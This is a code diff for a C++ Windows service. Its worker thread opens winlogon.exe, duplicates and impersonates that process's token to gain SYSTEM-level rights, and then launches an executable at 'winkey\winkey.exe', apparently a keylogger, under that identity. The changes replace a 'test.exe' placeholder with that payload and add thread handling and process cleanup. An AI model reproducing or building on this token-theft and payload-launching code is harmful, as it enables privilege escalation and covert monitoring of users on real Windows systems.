@@ -4,19 +4,21 @@ SERVICE_STATUS g_ServiceStatus = {0};
 SERVICE_STATUS_HANDLE g_ServiceStatusHandle = NULL;
 HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
 PROCESS_INFORMATION g_ProcessInfo = {0};
+HANDLE g_WorkerThread = NULL;
 
 /*#############################################################################
 # Service Implementation Methods
 #############################################################################*/
 
-static void WorkerThreadRoutine()
+DWORD WINAPI WorkerThreadRoutine(LPVOID lpParam)
 {
+	(void)lpParam; // Unused parameter
 	DebugLogToFile("Worker thread started.");
 
 	DWORD pid = GetProcessIdByName("winlogon.exe");
 	if (pid == 0) {
 		DebugLogToFile("Failed to get process ID for winlogon.exe");
-		return;
+		return 1;
 	}
 
 	DebugLogToFile("Winlogon.exe, PID: " + std::to_string(pid));
@@ -24,7 +26,7 @@ static void WorkerThreadRoutine()
 	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (hProcess == NULL) {
 		DebugLogToFile("Failed to open process for winlogon.exe");
-		return;
+		return 1;
 	}
 
 	HANDLE hToken = NULL;
@@ -32,7 +34,7 @@ static void WorkerThreadRoutine()
 	if (hToken == NULL) {
 		DebugLogToFile("Failed to open process token for winlogon.exe");
 		CloseHandle(hProcess);
-		return;
+		return 1;
 	}
 
 	HANDLE hDuplicatedToken = NULL;
@@ -42,7 +44,7 @@ static void WorkerThreadRoutine()
 		DebugLogToFile(errorMessage.str());
 		CloseHandle(hToken);
 		CloseHandle(hProcess);
-		return;
+		return 1;
 	}
 
 	if (!ImpersonateLoggedOnUser(hDuplicatedToken)) {
@@ -52,7 +54,7 @@ static void WorkerThreadRoutine()
 		CloseHandle(hDuplicatedToken);
 		CloseHandle(hToken);
 		CloseHandle(hProcess);
-		return;
+		return 1;
 	}
 
 	TCHAR currentPath[MAX_PATH];
@@ -64,7 +66,7 @@ static void WorkerThreadRoutine()
 		CloseHandle(hDuplicatedToken);
 		CloseHandle(hToken);
 		CloseHandle(hProcess);
-		return;
+		return 1;
 	}
 
 	DebugLogToFile("Current path: " + std::string(currentPath));
@@ -78,8 +80,8 @@ static void WorkerThreadRoutine()
 
 	// Build test.exe path: C:\path\to\test.exe
 	_tcscpy_s(commandLine, MAX_PATH, currentDirectory);
-	PathAppend(commandLine, _T("test.exe"));
-	// PathAppend(commandLine, _T("winkey\\winkey.exe"));
+	// PathAppend(commandLine, _T("test.exe"));
+	PathAppend(commandLine, _T("winkey\\winkey.exe"));
 	DebugLogToFile("Test executable path: " + std::string(commandLine));
 
 	STARTUPINFO si = {0};
@@ -107,12 +109,27 @@ static void WorkerThreadRoutine()
 		DebugLogToFile("Process created successfully");
 	}
 
+	    // Wait for the service to stop or the process to exit
+    HANDLE handles[2] = { g_ServiceStopEvent, g_ProcessInfo.hProcess };
+    DWORD waitResult = WaitForMultipleObjects(2, handles, FALSE, INFINITE);
+
+    if (waitResult == WAIT_OBJECT_0)
+    {
+        // Service stopped, close the process
+        TerminateProcess(g_ProcessInfo.hProcess, 0);
+    }
+
+    CloseHandle(g_ProcessInfo.hProcess);
+    CloseHandle(g_ProcessInfo.hThread);
+
 	// Revert impersonation
 	RevertToSelf();
 
 	CloseHandle(hDuplicatedToken);
 	CloseHandle(hToken);
 	CloseHandle(hProcess);
+
+	return 0;
 }
 
 static void ServiceControlHandler(DWORD control)
@@ -128,8 +145,26 @@ static void ServiceControlHandler(DWORD control)
 			g_ServiceStatus.dwCheckPoint = 4;
 			g_ServiceStatus.dwWin32ExitCode = NO_ERROR;
 			SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
-			// TODO: perform cleanup threads and processes here
-
+			
+			// **FIXED: Proper cleanup**
+			DebugLogToFile("Service stop requested - cleaning up processes");
+			
+			// Terminate spawned process if it's still running
+			if (g_ProcessInfo.hProcess != NULL) {
+				DebugLogToFile("Terminating spawned process");
+				TerminateProcess(g_ProcessInfo.hProcess, 0);
+				WaitForSingleObject(g_ProcessInfo.hProcess, 5000); // Wait max 5 seconds
+				CloseHandle(g_ProcessInfo.hProcess);
+				CloseHandle(g_ProcessInfo.hThread);
+				ZeroMemory(&g_ProcessInfo, sizeof(g_ProcessInfo));
+			}
+			
+			if (g_WorkerThread != NULL) {
+				DebugLogToFile("Waiting for worker thread to complete");
+				WaitForSingleObject(g_WorkerThread, INFINITE);
+				CloseHandle(g_WorkerThread);
+				g_WorkerThread = NULL;
+			}
 
 			SetEvent(g_ServiceStopEvent);
 			break;
@@ -148,7 +183,7 @@ void ServiceMain(DWORD argc, LPTSTR *argv)
 	g_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceControlHandler);
 	if (g_ServiceStatusHandle == NULL) {
 		std::cout << "RegisterServiceCtrlHandler failed: " << GetErrorMessage() << std::endl;
-		return;
+		return ;
 	}
 
 	ZeroMemory(&g_ServiceStatus, sizeof(g_ServiceStatus));
@@ -186,9 +221,21 @@ void ServiceMain(DWORD argc, LPTSTR *argv)
 	// Service is now running, perform service tasks here
 	// For demonstration, we will just wait for the stop event
 	DebugLogToFile("Service has started.");
-	WorkerThreadRoutine(); // Start worker thread or perform service tasks
+	g_WorkerThread = CreateThread(NULL, 0, WorkerThreadRoutine, NULL, 0, NULL);
+	if (g_WorkerThread == NULL) {
+		std::cout << "CreateThread failed: " << GetErrorMessage() << std::endl;
+		g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+		g_ServiceStatus.dwWin32ExitCode = GetLastError();
+		g_ServiceStatus.dwCheckPoint = 1;
+		SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
+		return;
+	}
 
 	WaitForSingleObject(g_ServiceStopEvent, INFINITE);
+
+	DebugLogToFile("Waiting for worker thread to complete");
+	WaitForSingleObject(g_WorkerThread, INFINITE); // Wait indefinitely
+	CloseHandle(g_WorkerThread);
 
 	if (g_ServiceStopEvent != INVALID_HANDLE_VALUE) {
 		CloseHandle(g_ServiceStopEvent);
